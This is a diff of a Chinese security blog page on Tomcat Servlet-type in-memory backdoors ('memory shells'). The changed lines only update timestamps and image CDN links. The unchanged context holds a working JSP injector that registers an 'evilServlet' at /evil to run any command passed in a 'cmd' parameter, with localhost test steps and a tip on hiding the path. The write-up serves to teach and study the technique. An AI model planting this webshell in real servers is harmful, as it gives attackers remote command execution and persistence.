@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-04-09T13:10:00.000Z">
-<meta property="article:modified_time" content="2026-05-14T10:03:45.617Z">
+<meta property="article:modified_time" content="2026-05-14T13:33:24.524Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="Java">
@@ -69,7 +69,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp5bt8ko">
+  <link rel="stylesheet" href="/css/main.css?v=mp5jbj7x">
 
 
   
@@ -78,7 +78,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-09T21:10:00+08:00","dateModified":"2026-05-14T18:03:45+08:00","datePublished":"2026-04-09T21:10:00+08:00","description":"","headline":"原理分析 | Servlet —— Tomcat 内存马","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/eb030935/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/eb030935/","keywords":"代码审计, Java, Tomcat, 内存马, RCE, Servlet","thumbnailUrl":"https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/4d438cbe94b6b665403e80f0294dcfba.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-09T21:10:00+08:00","dateModified":"2026-05-14T21:33:24+08:00","datePublished":"2026-04-09T21:10:00+08:00","description":"","headline":"原理分析 | Servlet —— Tomcat 内存马","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/eb030935/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/eb030935/","keywords":"代码审计, Java, Tomcat, 内存马, RCE, Servlet","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/4d438cbe94b6b665403e80f0294dcfba.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -149,11 +149,11 @@
 <p><strong>注意</strong>：动态注册的 Servlet 默认也是懒加载（首次访问时才调用 <code>init()</code>），但在内存马场景中，我们通常会在注入后立即主动访问一次后门路径来激活它，因此懒加载并不影响使用。</p>
 </blockquote>
 <p>启动服务后可以看到初始化的打印：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image1.png"></p>
 <p>访问 <code>http://localhost:8080/echo?msg=你好</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image2.png"></p>
 <p>关闭时触发销毁：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image3.png"></p>
 <hr>
 <h2 id="二、Filter-和-Servlet-的区别"><a href="#二、Filter-和-Servlet-的区别" class="headerlink" title="二、Filter 和 Servlet 的区别"></a>二、Filter 和 Servlet 的区别</h2><p>Filter 和 Servlet 最大的区别在于：</p>
 <ul>
@@ -162,7 +162,7 @@
 </ul>
 <p>设置 <code>@WebServlet(&quot;/echo&quot;)</code> 后，访问 <code>/echo</code> 就会由这个 Servlet 处理。</p>
 <p>如果设置 <code>@WebServlet(&quot;/*&quot;)</code>，那么不管访问 <code>/xxxx</code> 什么路径都会由这个 Servlet 处理。比如访问 <code>http://localhost:8080/asdasd?msg=aaa</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image4.png"></p>
 <p><strong>依然可以正确显示内容，并没有 404，因为符合通配符规则。</strong></p>
 <p>Servlet 的 <code>doGet</code> 方法里没有类似 <code>chain.doFilter()</code> 的结尾，因为 <strong>Servlet 就是整条链的终点</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求 → Filter1.doFilter() → Filter2.doFilter() → Servlet.doGet() → 响应</span><br><span class="line">       ↓ 可截断 return       ↓ 可截断 return       直接输出，无后续</span><br></pre></td></tr></table></figure>
@@ -323,7 +323,7 @@
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> len;</span><br><span class="line">                <span class="keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line">                resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;Servlet is running...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            doGet(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ServletRegistration.<span class="type">Dynamic</span> <span class="variable">dynamic</span> <span class="operator">=</span> servletContext.addServlet(<span class="string">&quot;evilServlet&quot;</span>, evilServlet);</span><br><span class="line">    dynamic.addMapping(<span class="string">&quot;/evil&quot;</span>);</span><br><span class="line">    out.println(<span class="string">&quot;Servlet 内存马注入成功！访问 /evil?cmd=whoami 测试&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
 <p>访问 <code>http://localhost:8080/inject.jsp</code> 后会直接报错：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image5.png"></p>
 <p><strong>报错原因</strong>：这是 <strong>Servlet 规范的限制</strong>——一旦 Web 应用启动完成，<code>ServletContext</code> 就进入”已初始化”状态，<strong>禁止再调用 <code>addServlet()</code> 动态注册</strong>。</p>
 <p><code>addServlet()</code> 方法内部会调用 <code>checkState()</code>，判断应用是否已完成初始化，如果已完成则抛出 <code>IllegalStateException</code>。</p>
 <hr>
@@ -342,15 +342,15 @@
 <h2 id="七、验证步骤"><a href="#七、验证步骤" class="headerlink" title="七、验证步骤"></a>七、验证步骤</h2><p><strong>1. 准备环境</strong>：确保 Tomcat 正在运行，且存在一个 Web 应用（比如之前的 Filter 项目）。</p>
 <p>**2. 上传 <code>injectServlet.jsp</code>**：将该 JSP 文件放到 Web 应用的根目录（如 <code>webapp/injectServlet.jsp</code>）。</p>
 <p><strong>3. 访问注入页面</strong>：浏览器访问 <code>http://localhost:8080/injectServlet.jsp</code>，页面显示”注入成功”。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image6.png"></p>
 <p><strong>4. 测试后门</strong>：访问 <code>http://localhost:8080/evil?cmd=whoami</code>，看到命令执行结果。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image7.png"></p>
 <p><strong>5. 验证无文件落地</strong>：删除 <code>injectServlet.jsp</code> 文件，再次访问 <code>http://localhost:8080/injectServlet.jsp</code> 显示 404：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image8.png"></p>
 <p>再次访问 <code>/evil?cmd=calc</code>，仍然有效：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image9.png"></p>
 <p><strong>6. 重启验证</strong>：重启 Tomcat 后直接访问 <code>/evil?cmd=whoami</code>，显示 404 或首页，说明内存马已消失（内存已释放）：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/Servlet_image10.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image10.png"></p>
 <hr>
 <h2 id="八、注意事项"><a href="#八、注意事项" class="headerlink" title="八、注意事项"></a>八、注意事项</h2><h3 id="1-路径冲突问题"><a href="#1-路径冲突问题" class="headerlink" title="1. 路径冲突问题"></a>1. 路径冲突问题</h3><p>如果目标应用本身已经有一个名为 <code>evilServlet</code> 的 Servlet，或存在 <code>/evil</code> 的映射，<code>addServlet</code> 或 <code>addMapping</code> 会抛出异常。在实际渗透中，攻击者通常会使用随机字符串（如 UUID）作为名称和路径，避免冲突。</p>
 <h3 id="2-与-Filter-型的适用场景"><a href="#2-与-Filter-型的适用场景" class="headerlink" title="2. 与 Filter 型的适用场景"></a>2. 与 Filter 型的适用场景</h3><ul>
@@ -822,7 +822,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp5bt8kr" defer></script>
+<script src="/js/main.js?v=mp5jbj81" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1086,7 +1086,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp5bt8kr"></script>
+<script src="/js/plugins/achievements.js?v=mp5jbj81"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
